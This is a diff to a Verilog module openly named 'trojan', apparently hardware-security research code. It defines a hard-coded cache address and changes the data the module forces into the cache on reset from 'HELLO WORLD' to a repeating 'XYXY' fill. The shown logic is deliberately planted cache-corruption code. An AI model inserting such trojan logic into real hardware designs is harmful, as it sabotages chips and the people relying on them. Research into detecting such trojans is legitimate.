@@ -1,6 +1,8 @@
 
 `include "global_defines.v"
 
+`define TROJ_CACHE_BASE_ADDR 32'h0020E900
+
 module trojan (
     input wire i_clk,
     input wire i_rst,
@@ -55,26 +57,19 @@ module trojan (
 
 	reg 		stall_reg;
 	
-	assign troj_data1 = 128'h00000000000000000000000048454C4C;		/// "HELL"
-	assign troj_data2 = 128'h0000000000000000000000004F20574F;		/// "O WO"
-	assign troj_data3 = 128'h000000000000000000000000524C4400;		/// "RLD\0"
-	
-	//assign o_troj_write_addr 		= 32'h3E00_0000;
-	//assign o_troj_write_addr_nxt 	= 32'h3E00_0020;
+	assign troj_data1 = 128'h58595859585958595859585958595859;		/// "XYXY..."
+	assign troj_data2 = 128'h58595859585958595859585958595859;
+	assign troj_data3 = 128'h00595859585958595859585958595859;		
 	
 	always @(posedge i_clk) begin
 		if (i_rst) begin
 			o_troj 			<= 1'b1;
 			cache_state 		<= 16'b0;
 			o_troj_write_data 	<= troj_data1;
-			o_troj_write_addr	<= 32'h0020_E900;		/// Line 233
+			o_troj_write_addr	<= `TROJ_CACHE_BASE_ADDR;
 			stall_reg		<= 1'b0;
-			// $display("Setting data to %h", o_troj_write_data);
-			// $display("Setting addr to %h", o_troj_write_addr);	
 		end
 		else if (!i_cache_stall) begin
-			// $display("Setting data to %h", o_troj_write_data);
-			// $display("Setting addr to %h", o_troj_write_addr);
 			if (!stall_reg) begin
 				o_troj			<= o_troj_nxt;
 				cache_state		<= cache_state_nxt;
